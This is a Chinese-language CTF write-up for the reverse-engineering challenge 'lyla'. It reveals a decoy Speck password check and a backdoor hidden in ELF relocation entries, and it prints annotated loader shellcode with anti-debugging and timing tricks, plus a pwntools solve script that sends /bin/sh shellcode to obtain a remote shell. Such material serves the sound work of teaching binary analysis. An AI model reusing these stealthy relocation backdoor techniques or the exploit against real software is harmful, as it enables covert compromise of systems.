# lyla

Reverse; 400 points; 1 solve

Link to challenge: https://o.riat.re/lyla-a77c6d95f414453b4f170346cc902eb9e7fd33ddc10b471b95c21239e1b47852.tar.gz

## Description

> 面对如此传统的逆向工程题目，代码量不大，输入密码换取 flag 的经典设计，你还在等什么，快来解它！
> 
> 注意：题目保证有解，但解不唯一。
> 
> nc \<ip\> 1337

## Observations

（比赛时有做这道题目的同学可以跳过本节）

附件解压后可以得到这些文件：

```
$ tree .
.
├── docker-compose.yaml
├── Dockerfile
├── flag.txt
└── lyla

1 directory, 4 files
$ file lyla
lyla: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a6e1303a40f0bf951b5e3f63be8e137237efe315, for GNU/Linux 3.2.0, stripped
```

其中 `lyla` 为待分析的程序本体，而剩下三个文件则是用于复现题目运行环境的部署文件。

我们使用 IDA Pro + Hex-Rays 分析 `lyla`，很容易就能梳理出程序的主要逻辑，这里直接贴出源码，不再赘述：

<details>
<summary>点击展开代码</summary>

```cpp
char g_password[256];
// sub_2800
std::ifstream OpenFlag() {
  if (!std::filesystem::exists("flag.txt")) {
    std::cerr
        << "Flag file not found in current directory, challenge is broken."
        << std::endl;
    abort();
  }
  if (std::filesystem::file_size("flag.txt") < 2) {
    std::cerr << "Flag file is empty, challenge is broken." << std::endl;
    abort();
  }
  std::ifstream file{"flag.txt"};
  if (!file) {
    std::cerr << "Failed to open flag file, challenge is broken." << std::endl;
    abort();
  }
  return file;
}
// sub_2680
void AlarmHandler(int) {
  puts("Timed out.");
  exit(0);
}
// sub_2710
bool Verify(std::string_view flag) {
  if (!flag.starts_with("password{") || !flag.ends_with("}")) {
    return false;
  }
  auto key = flag.substr(9, flag.length() - 10);
  if (key.size() != 16) {
    return false;
  }
  unsigned char output[32];
  uint64_t rawkey[2];
  memcpy(rawkey, key.data(), sizeof(rawkey));
  Encrypt(output, kInput, sizeof(output), rawkey); // sub_2F70
  return !memcmp(output, kExpected, sizeof(kExpected));
}
int main(int argc, char *argv[]) {
  setvbuf(stdin, nullptr, _IONBF, 0);
  setvbuf(stdout, nullptr, _IONBF, 0);
  setvbuf(stderr, nullptr, _IONBF, 0);
  std::ios::sync_with_stdio(false);

  std::ifstream flag_file = OpenFlag();
  signal(SIGALRM, AlarmHandler);
  alarm(60);

  std::cout << "Welcome to Lyla, the devious flag vending machine." << '\n';
  std::cout << "Input password: ";
  std::cout.flush();
  std::cin.getline(g_password, sizeof(g_password));
  if (Verify(g_password)) {
    std::cout << "Correct password! Congratulations, here is the flag:" << '\n';
    std::cout << flag_file.rdbuf();
    std::cout.flush();
  } else {
    std::cout << "Nope." << std::endl;
  }
  return 0;
}
```
</details>

其中 `.rdbuf()` 的部分可能不太明显，不过选手应该很容易猜测出其是在密码正确的情况下将 `flag.txt` 的内容输出到标准输出。显然，重点在于 `sub_2710` 处验证函数中里的加密函数 `sub_2F70`。

## Cipher

（比赛时有做这道题目的同学可以跳过本节）

这个函数开头拿我们输入的“密码”生成了 32 个疑似子密钥的东西，这里的逻辑看起来被循环展开了，长得十分丑陋：

<details>
<summary>点击展开丑陋代码</summary>

```cpp
unsigned __int64 __fastcall sub_2F70(__int64 *a1, __int64 *a2, unsigned __int64 a3, __int64 *a4)
{
    /* ... */
    v87 = __readfsqword(0x28u);
    v4 = a3 & 0xF;
    if ( (a3 & 0xF) != 0 )
        __assert_fail("size % 16 == 0", "<redacted>", 0x34u, "<redacted>");
    v6 = *a4 + __ROR8__(a4[1], 8);
    v83[0] = *a4;
    v7 = v6 ^ __ROR8__(v83[0], 61);
    v8 = (v7 + __ROR8__(v6, 8)) ^ 1;
    v83[1] = v7;
    v9 = v8 ^ __ROR8__(v7, 61);
    v10 = (v9 + __ROR8__(v8, 8)) ^ 2;
    v83[2] = v9;
    v11 = v10 ^ __ROR8__(v9, 61);
    v12 = (v11 + __ROR8__(v10, 8)) ^ 3;
    v83[3] = v11;
    /* 略，一共重复了 32 次 */
```
</details>

不难发现其中的规律，我们把它改写的漂亮一点：

```cpp
unsigned __int64 __fVjjjjjjjjjastcall sub_2F70(__int64 *a1, __int64 *a2, unsigned __int64 a3, __int64 *a4)
{
    uint64_t key[32];
    uint64_t A = a4[0], B = a4[1];
    for (int i = 0; i < 32; i++) {
        B = (__ROR8__(B, 8) + A) ^ i;
        key[i] = A;
        A = B ^ __ROR8__(A, 61);
    }
```

类似的，下面的加密循环也被循环展开了（尽管展开的层数少一些）：

<details>
<summary>点击展开丑陋代码</summary>

```cpp
    do
    {
      v65 = *a2;
      v66 = a2[1];
      v67 = v83;
      do
      {
        v68 = *v67 ^ (v65 + __ROR8__(v66, 8));
        v69 = v68 ^ __ROR8__(v65, 61);
        v70 = v67[1] ^ (v69 + __ROR8__(v68, 8));
        v71 = v70 ^ __ROR8__(v69, 61);
        v72 = v67[2] ^ (v71 + __ROR8__(v70, 8));
        v73 = v72 ^ __ROR8__(v71, 61);
        v74 = v67[3] ^ (v73 + __ROR8__(v72, 8));
        v75 = v74 ^ __ROR8__(v73, 61);
        v76 = v67[4] ^ (v75 + __ROR8__(v74, 8));
        v77 = v76 ^ __ROR8__(v75, 61);
        v78 = v67[5] ^ (v77 + __ROR8__(v76, 8));
        v79 = v78 ^ __ROR8__(v77, 61);
        v80 = v67[6] ^ (v79 + __ROR8__(v78, 8));
        v81 = v80 ^ __ROR8__(v79, 61);
        v66 = v67[7] ^ (v81 + __ROR8__(v80, 8));
        v67 += 8;
        v65 = v66 ^ __ROR8__(v81, 61);
      }
      while ( &v86 != (char *)v67 );
      v4 += 16LL;
      *a1 = v65;
      a1[1] = v66;
    }
    while ( v4 < a3 );
```
</details>

不难看出，它其实是：

```cpp
    for (int v4 = 0; v4 < a3; v4 += 16) {
        uint64_t v65 = a2[0], v66 = a2[1];
        for (int i = 0; i < 32; i++) {
            v66 = (__ROR8__(v66, 8) + v65) ^ key[i];
            v65 = v66 ^ __ROR8__(v65, 61);
        }
        a1[0] = v65;
        a1[1] = v66;
    }
```

到这里，我们可以得出结论：这是一个 block cipher，块大小为 16 字节，密钥长度为 16 字节，其进行了 32 轮纯粹由加法、循环位移和异或的操作。其 Key Schedule 过程和加密过程是同构的。唯一的问题在于，和一般逆向题固定密钥要求找出对应某个输出的输入不同，这里是固定输入和输出，要求找出使其成立的密钥。

此外，我们可以注意到，无论传入的输入多长，加密函数都只处理其前 16 字节。前面主逻辑里我们可以看到其提供给加密函数的输入是 32 字节的，比较时也是比较的完整 32 字节的结果，而这里后 16 字节并没有被处理，因此题目主逻辑里的条件，好像，不可能被满足啊？？？

## Cipher???

再来回头看看这个 cipher，注意到它是 ARX 结构的，浏览一圈之后我们可以找到一个叫 [Speck](https://en.wikipedia.org/wiki/Speck_(cipher)) 的 cipher 和这里的实现精确一致。问题是……这个密码算法，它好像，是安全的啊？这意味着我们不可能根据两组输入和输出就还原密钥。结合上面的 bug，我们可以确信：这个题目是无解的。

但是题目描述里特地写了有解，这是怎么回事呢？难道我们被 IDA 骗了，程序里还隐藏着更多逻辑吗？

## Reverse Harder

假设这个程序里面有隐藏的逻辑，那么它会隐藏在哪里呢？除开明面上有的代码以外，哪里还可能隐藏着能控制这个程序的逻辑呢？建议读者在这里停下来，自行尝试探索一下。
我们先来排除一些错误答案：

* 在反汇编器里把程序里每个函数，每个字节都从头到尾仔仔细细的看一遍。这样并不能找到什么。
* init_array、fini_array、.init、.fini 里都没有特别的东西。

接下来，如果还没有思路的话，这里给出两个线索，我们同样鼓励读者在阅读每个线索后自行探索一番再继续展开后续剧透：

<details>
<summary>线索一</summary>

在十六进制编辑器中打开，可以看到程序的 .text 节结尾处的正常代码后面并不像其他程序一样全部是 0，而是在一段 00 后还有一段高 entropy 的数据，它们是做什么的？在什么情况下会被用到？
</details>

<details>
<summary>线索二</summary>

```
$ readelf -a lyla
# ...
Dynamic section at offset 0x4c88 contains 29 entries:
# ...
 0x000000000000001e (FLAGS)              TEXTREL BIND_NOW
 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
 0x000000006ffffffe (VERNEED)            0x1048
 0x000000006fffffff (VERNEEDNUM)         3
 0x000000006ffffff0 (VERSYM)             0xfd4
 0x000000006ffffff9 (RELACOUNT)          8
 0x0000000000000000 (NULL)               0x0

Relocation section '.rela.dyn' at offset 0x1118 contains 26 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
0000000008e4  000000000008 R_X86_64_RELATIVE                    2600
0000000008e6  000000000008 R_X86_64_RELATIVE                    25f1
0000000008e7  000000000008 R_X86_64_RELATIVE                    25ff
0000000008e8  000000000008 R_X86_64_RELATIVE                    1db0
000000005be0  000000000008 R_X86_64_RELATIVE                    2670
000000005be8  000000000008 R_X86_64_RELATIVE                    2560
000000005bf0  000000000008 R_X86_64_RELATIVE                    2630
000000006008  000000000008 R_X86_64_RELATIVE                    6008
000000005fd0  002c00000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0
000000005fd8  000f00000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
# ...
```

<details>
<summary>提示一</summary>
TEXTREL 是起什么作用的？听上去是用来重定位 .text 节的，但 PIE 不是不需要对代码做重定位吗？它为什么会和 PIE 组合出现？
</details>
<details>
<summary>提示二</summary>
RELA 重定位表中的 R_X86_64_RELATIVE 项会向目标 offset 处写入 8 字节，可开头的四项为什么看起来写入目的地址是重叠的？它们往哪里，写了什么？
</details>
<details>
<summary>提示三</summary>

这四项覆盖了 ELF 符号表中 `_ZNKSt5ctypeIcE8do_widenEc` 的类型和值，这个符号在哪里用到了？
</details>
</details>

再次提醒，题目被设计为选手一旦找到了入手点便很容易顺藤摸瓜解决的样子，如果您有兴趣尝试自行探索，请在这里停止阅读。

<details>
<summary>剧透警告</summary>

## 后门加载

后门代码的解码和触发逻辑藏在了重定位表里，重定位表的结构这
里不再赘述，感兴趣的同学可以自行翻阅 glibc 源码中的 `glibc/sysdeps/x86_64/dl-machine.h`。

加载阶段利用了以下两个重定位类型：

* `R_X86_64_COPY` - 记指定 symbol 解析出来的地址为 symbol_value，则实际效果为 `memcpy(elf_base+addr, symbol_value, symbol_size);`
* `R_X86_64_RELATIVE` - `*(uint64_t*)(elf_base+addr) = (elf_base+addend);`

为了让包含后门的重定位表不显得过于显眼，我们并没有选择将触发后门的重定位表项直接插入原始的重定位表中，而是利用 RELA 和 JMPREL 在内存中紧密相接这一点，修改 DT_RELASZ，将其设置为 DT_RELASZ + DT_PLTRELSZ - 1 [1]，使得 .rela.plt 节中的内容会被解析两次，并在 .rela.dyn 中加入了五项作为第一阶段，其中四个 `R_X86_64_RELATIVE`
覆盖了 ELF 符号表中 `_ZNKSt5ctypeIcE8do_widenEc` 的类型为绝对符号，然后将其值覆盖为符号表中 `_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE10_M_disposeEv` 的元数据地址。

接下来，在运行到引用了该符号的 `R_X86_64_COPY` 时，其用位于首个 ELF Segment 结尾，偏移 0x1DB0 处的一小段数据覆盖符号表中 `..._disposeEv` 的元数据。

覆盖的元数据将类型置为 LOCAL，值置为 0x1A50，大小置为 0x348。该处存放的是实际实现后门注入功能的重定位表项。后续触发该符号的 `R_X86_6
4_COPY` 时将 0x1A50 处的后门重定位项覆盖至 .rela.plt 节中。ld.so 在接下来处理 JMPREL 时即会运行我们触发后门的重定位表项。

这里借用的两个符号原本并不会有对应的 `R_X86_64_COPY` 存在，但应该没有人会注意到这一点吧w

这里用了一个两层的加载，设计上有两点考虑：

* 在 binary 被 strip 或由 WSL 加载等情况下避免 crash。
    - 前述两种情况下 segment 末尾的数据均会被清零，如果没有第二层加载，我们将会使用全 0 数据覆盖重定位表，导致程序 crash。
    - 加入第二层加载后，如果 segment 末尾的数据被清零，则第二次 COPY 的大小为 0，则后门实际上被清除，但程序不会崩溃引起怀疑。
* 可以最大限度的减少表面上的 RELA 表和符号表中看上去可疑的数据。
    - 这样处理后，RELA 表中仅多出来四个程序中本就很多的 `R_X86_64_RELATIVE` 类型的重定位，及两个看似无关的符号上的 `R_X86_64_COPY`。
    - 除非仔细盯着它们的目标 offset 看，很难意识到它们有问题。

[1] 减一的原因是 ld.so 里特别检查了 JMPREL 完全是 RELA 的一部分的情况，在这种情况下会跳过第二次执行。

<details>
<summary>更多剧透警告</summary>

## 后门重定位表项

后门中利用了以下几个重定位类型：

* `R_X86_64_SIZE64` - 指定 symbol index = 0，则该重定位项的实际效果为写 `*(uint64_t*)(elf_base+addr) = (addend+0);`
* `R_X86_64_COPY` - 记指定 symbol 解析出来的地址为 symbol_value，则实际效果为 `memcpy(elf_base+addr, symbol_value, symbol_size);`
* `R_X86_64_RELATIVE` - `*(uint64_t*)(elf_base+addr) = (elf_base+addend);`
* `R_X86_64_64` - 记指定 symbol 解析出来的地址为 symbol_value，则实际效果为 `*(uint64_t*)(elf_base+addr) = (symbol_value + addend);`

此外我们还利用了 IFUNC 机制，将符号类型设置为 `STT_GNU_IFUNC` 后，ld.so 在解析该符号时会将原本解析出来的值当作函数指针调用，并将函数返回值作为解析出来的符号值。这可以用来触发 shellcode 执行。

Patch 一下 ELF 的 section table 和 .dynamic，修改 JMPREL 为 0x1A50，可以列出我们加入的重定位项如下：

```
Relocation section '.rela.plt' at offset 0x1a50 contains 36 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
0000000008f0  000000000021 R_X86_64_SIZE64                      8
0000000008e8  000000000008 R_X86_64_RELATIVE                    5d70
0000000008e8  003400000005 R_X86_64_COPY     0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 0
0000000008e8  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 8
0000000008e8  003400000005 R_X86_64_COPY     0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 0
0000000039a5  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + a8
0000000008e8  000000000021 R_X86_64_SIZE64                      16493f2103392e07
00000000394d  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 4599d06a45025d41
000000003975  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 3db6c010e3b20b6d
000000000760  000000000021 R_X86_64_SIZE64                      1200005be0
0000000039ad  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 432d2b3e4fe15b46
000000000798  000000000008 R_X86_64_RELATIVE                    3945
000000006508  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 601e33405c333658
00000000395d  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 3299f71177f07ebf
000000003995  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 5e45c510bcf87d70
00000000398d  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 55de21ab84bda0bf
000000003955  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 23890dca8e09f487
000000003985  000000000008 R_X86_64_RELATIVE                    1a40
000000003965  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 1157fea7cdc85d0c
00000000399d  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 5bff483e74352af5
0000000039b5  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 16487b760fdd6dd6
000000003945  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 16493f30e5abe5b4
00000000396d  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 742301bac3c48361
00000000397d  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 5affe5a498f9850f
000000000790  000000000021 R_X86_64_SIZE64                      -efff600000000
000000000770  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 16493f2103392dff
00000000393d  002400000005 R_X86_64_COPY     0000000000000000 _ITM_deregisterTM[...] + 0
000000006508  000f00000001 R_X86_64_64       0000000000000000 __libc_start_main@GLIBC_2.34 + 0
000000006508  003400000001 R_X86_64_64       0000000000002bb0 _ZNKSt5ctypeIcE8d[...] - 16493f209dcbc493
000000003935  002400000001 R_X86_64_64       0000000000000000 _ITM_deregisterTM[...] + 0
0000000039b3  002600000001 R_X86_64_64       0000000000000000 __gmon_start__ + 0
000000003935  000000000021 R_X86_64_SIZE64                      0
0000000008e8  000000000008 R_X86_64_RELATIVE                    16e8
0000000008f0  000000000021 R_X86_64_SIZE64                      360
000000001388  003400000005 R_X86_64_COPY     0000000000002bb0 _ZNKSt5ctypeIcE8d[...] + 0
000000000000  000000000000 R_X86_64_NONE                        0
```

阅读一番，可以梳理出其逻辑如下：

1. 获取 ELF .dynamic 节中的 DT_DEBUG 指针，该指针指向一个 `_r_debug` 结构体，其中包含了一个指向 `link_map` 结构体的指针，该结构体包含了 ELF 的基地址、大小、符号表及所有的 dynamic tag 的值。
2. 计算出 link_map + 64 + 13 * 8 的地址保存至 .text 结尾处备用，其中 13 为 DT_FINI 的值。该地址是 `link_map->dl_info[DT_FINI]`，其控制了 ld.so 在程序退出时调用的 fini 函数地址。
3. 解析 `_dl_argv` 变量和 `time` 函数的值备用。
4. 在 .text 段结尾处写入一段 shellcode 并利用 IFUNC 机制运行。

其中解析符号是通过修改符号表，再触发 `R_X86_64_64` 实现的，读取内存是通过 `R_X86_64_COPY` 实现的，写入的常量不是明文，而是通过 `R_X86_64_64` 做了一个加法。

后门重定位表项的最后使用 `R_X86_64_COPY` 将备份的原始 .rela.plt 内容复制了回去。这样在第二次执行处理 JMPREL 时将可以正常处理原始 JMPREL 中的重定位项。

## Shellcode

由于 ELF Reloc Machine 中没有办法实现写绝对地址（只能相对于正在加载的 ELF 写），只能通过 shellcode 来完成写绝对地址的操作。Shellcode 中顺便做了反调试工作。

注释后的 shellcode 内容如下：

```asm
_begin:
    push rbx
    lea rbx, [rip+_begin-8]
    mov rdi, [rbx] /* &_dl_argv */

    // Make sure argv[0] starts with '/' (which is unusual when debugging, but plausible with xinetd)
    mov rcx, [rdi]
    jrcxz bye
    cmp byte ptr [rcx], '/'
    jnz bye

    /* Optimized (for size) loop for skipping argv */
    /* No need to populate rcx: it is guaranteed to have a pointer now */
    xor eax, eax
    repnz scasq

    // Check for environment variable "COLUMNS" and "LD_*".
    // To make it tight we use an approximation: just check the first 4 characters.
env_check_loop:
    mov rcx, [rdi]
    scasq
    jrcxz env_check_okay
    mov eax, dword ptr [rcx]
    ror eax, 1
    cmp eax, 0xaaa627a1 /* "COLU" */
    jz bye
    // hex(ror(u32(b"LD_P"), 1, 32) & 0xffff). there might be false positive but
    // we don't care as long as there aren't in prod.
    cmp ax, 0xa226
    jz bye
    jmp env_check_loop

env_check_okay:
    /* Patch payload to only run at correct time. rdi points to auxv (writable) */
    xor edi, edi
    call [rbx-8]
    /* Decode payload only when time() % 64 == 0 */
    test al, 63
    movqq rcx, PAYLOAD_SIZE_IN_WORDS
    movabs r11, VALUE_TO_WRITE
    lea rdi, [rbx+(_end-_begin)+8]
    jnz bye
    imul eax, eax, 119
    stosd
    // Decode payload
    xor eax, eax
decode_loop:
    xor [rdi+rcx*4], eax
    jz bye
    add eax, [rdi+rcx*4]
    loop decode_loop

    // Overwrite dl_info[DT_FINI] in link_map
    movabs r10, ADDR_TO_WRITE
    mov [r10], r11
bye:
    // Zeroing self
    movqq rdi, rbx
    movqq rcx, _fin-_begin+8
    xor eax, eax
    pop rbx
    rep stosb
    _fin:
    ret
_end:
```

这里采用的反调试 trick 有：

* 检查 `argv[0]` 是否以 `'/'` 开头
* 检查环境变量中是否包含 `COLUMNS` （gdb 会设置该环境变量）
* 检查环境变量中是否包含 `LD_*`
* 检测 `time()` 的返回值是否模 64 为 0（即后门每 64 秒触发一次）

都通过后会将 `link_map->dl_info[DT_FINI]` 的值覆盖为这段 shellcode 结尾处的地址，并解码其内容，将 `time()` 乘 119
后保存到指定偏移，最后将自身内容清零。通过控制文件中的内容布局，我们在 shellcode 结尾处布置了另一段编码后的 shellcode，这样它会在程序退出时被执行。

## Actual Backdoor

另一段 shellcode 则是实际的后门代码，其会首先解析 vDSO 中的 `clock_gettime`，检查此时 `clock_gettime(CLOCK_REALTIME, ...)` 的返回值和程序开始时间是否正好差 3，程序里读入的密码 buffer + 255 字节偏移处是否非 0，若都是，则在程序里面读入的密码 + 128 字节偏移处的 16 字节上以硬编码的密钥运行 Speck (128/128)，并检查结果是否为
另一硬编码的值。若满足条件，则将密码 buffer 通过 mprotect 设置为可执行并运行。

逆向清楚后门的逻辑后，获取 flag 就比较简单了，我们只需要使用 Speck (128/128) 解密触发后门所需的数据，将其和 /bin/sh shellcode 按照上述格式拼接好，在符合条件的时间连接到远程服务器，在三秒后发送，即可获得 shell。获得 shell 后直接 `cat flag.txt` 即可。如果选手的环境没有条件和服务器时间达成同步，也可以每秒启动一个连接，直
到成功，也可以在至多 70 秒内解出。

## solve.py

```python
from pwn import *

context.arch = 'amd64'

ACTUAL_KEY = [0x85615CE70BA97239, 0xAF6F5627BC993A1E]

class Speck:
  KEY_SIZE = 16
  BLOCK_SIZE = 16
  ROUNDS = 32

  def __init__(self, key: bytes):
    self.subkeys = self.key_schedule(key)

  @staticmethod
  def forward(x, y, k):
    x = ror(x, 8, 64)
    x = (x + y) % 2**64
    x ^= k
    y = rol(y, 3, 64)
    y ^= x
    return x, y
  
  @staticmethod
  def backward(x, y, k):
    y ^= x
    y = ror(y, 3, 64)
    x ^= k
    x = (x - y) % 2**64
    x = rol(x, 8, 64)
    return x, y

  def key_schedule(self, key: bytes):
    assert len(key) == self.KEY_SIZE
    A, B = (u64(key[:8]), u64(key[8:]))
    result = []
    for i in range(self.ROUNDS):
      result.append(A)
      B, A = self.forward(B, A, i)
    return result

  def encrypt_block(self, block: bytes):
    assert len(block) == self.BLOCK_SIZE
    x, y = (u64(block[:8]), u64(block[8:]))
    for i in range(self.ROUNDS):
      y, x = self.forward(y, x, self.subkeys[i])
    return p64(x) + p64(y)

  def decrypt_block(self, block: bytes):
    assert len(block) == self.BLOCK_SIZE
    x, y = (u64(block[:8]), u64(block[8:]))
    for i in range(self.ROUNDS - 1, -1, -1):
      y, x = self.backward(y, x, self.subkeys[i])
    return p64(x) + p64(y)

def sanity():
  speck = Speck(b"\x00" * 16)
  assert speck.decrypt_block(speck.encrypt_block(b"\x00"*16)) == b"\x00"*16
  speck = Speck(bytes(range(16)))
  assert speck.encrypt_block(b" made it equival") == bytes([0x18, 0x0d, 0x57, 0x5c, 0xdf, 0xfe, 0x60, 0x78, 0x65, 0x32, 0x78, 0x79, 0x51, 0x98, 0x5d, 0xa6])

sanity()

if args.WRONG_KEY:
  ACTUAL_KEY[0] = 114514

cipher = Speck(p64(ACTUAL_KEY[0]) + p64(ACTUAL_KEY[1]))
payload = flat({
  0: asm(shellcraft.sh()),
  128: cipher.decrypt_block(b"\x00"*16),
}, length=255)
assert b"\n" not in payload

if args.MISALIGN:
  while int(time.time())%64 == 0:
    time.sleep(0.1)
else:
  log.info("Waiting for backdoor trigger interval...")
  while int(time.time())%64 != 0:
    time.sleep(0.5)

if args.REMOTE:
  r = remote(args.HOST, args.PORT)
else:
  r = process(args.EXE or os.path.realpath("./lyla"))

r.recvuntil(b"Input password: ")
time.sleep(int(args.DELAY or 3))
r.sendline(payload)
r.interactive()
```

</details>

</details>

</details>

------------------------
<details>
<summary>杂谈环节（含剧透）</summary>

## Backstory

1. 题目中的检查函数里只加密了 16 字节，却比较了 32 个字节，当然并不是用来让选手“相信自己”，提示选手伪装题无解而做的深思熟虑的设计（笑），而真的是写错了。我们原本预期这个错误会导致选手产生怀疑，从而会有更多的选手发现后门所在，决定将错就错，正好让题目简单一些，但从比赛结果来看，好像并没有起到这个效果。
    ```cpp
    void Encrypt(void *dst, const void *src, size_t size, uint64_t rawkey[2]) {
        assert(size % 16 == 0);
        dst = __builtin_assume_aligned(dst, 16);
        src = __builtin_assume_aligned(src, 16);

        uint64_t key[kRounds];
        ExpandKey(key, rawkey);
        for (size_t i = 0; i < size; i += 16) {
            // BUG: 忘记加 i 惹。
            uint64_t *current_dst = reinterpret_cast<uint64_t *>(dst);
            const uint64_t *current_src = reinterpret_cast<const uint64_t *>(src);
            uint64_t x = current_src[0], y = current_src[1];
            for (int i = 0; i < kRounds; i++) {
                SpeckRound(y, x, key[i]);
            }
            current_dst[0] = x;
            current_dst[1] = y;
        }
    }
    ```
2. 题目本来的名字是“伪◯拘◯”，作为提示，兴许还能让这个题目更简单一些（？），但实在是没有勇气真的挂出来，于是请 ChatGPT 帮忙随便起了一个名字。没有想到的是，"lyla" 这个名字居然被 NeSE 理解出了 “估计跟 RELA 有点关系” 的含义……
3. 可能有些选手已经猜到了，本题的 idea 来自 hxp 在 36C3 CTF 上出的 `md15` 一题及 Google CTF 2022 的 `eldar` 一题，可以说是这两道题目的超融合邪恶加强版。
4. 题目其实在今年 (2023) 的 hxp CTF 2022 之前就已经准备好了，结果 hxp CTF 上又出现了一道利用 reloc 黑魔法的逆向题。瞬间让这道题难度大减（一旦知道看 reloc，具体的 trick 就不重要了），关键是我这套实现比那道题目简单粗暴的 IRELATIVE 可精致多了……实在不忍心废弃掉题目，于是又加入了一堆 trick，总算是勉强藏到了即使做了那道题的同学也不会轻易看出来的程度。
5. 后门里面采用了和伪装题同样的 Speck (128/128) 密码算法，是为了让逆向了伪装题并尝试去解了的选手的功夫不至于完全白费，不知道有没有选手领情 :P

## 设计思路 Q&A

* 为什么后门触发条件用 time()？
    - 因为获取时间走 vDSO，不需要系统调用，不会触发 `catch throw`，也不会在 strace 中留痕。
* 为什么要每 64 秒触发一次？
    - 为了防止 attach 到容器内实际运行的进程上扫代码直接扫出来后门代码。
* 为什么反调试只查这些偏门的东西？
    - 反调试部分的核心设计思路为“被动反调试”，即只检查环境里有的东西，避免做系统调用。

</details>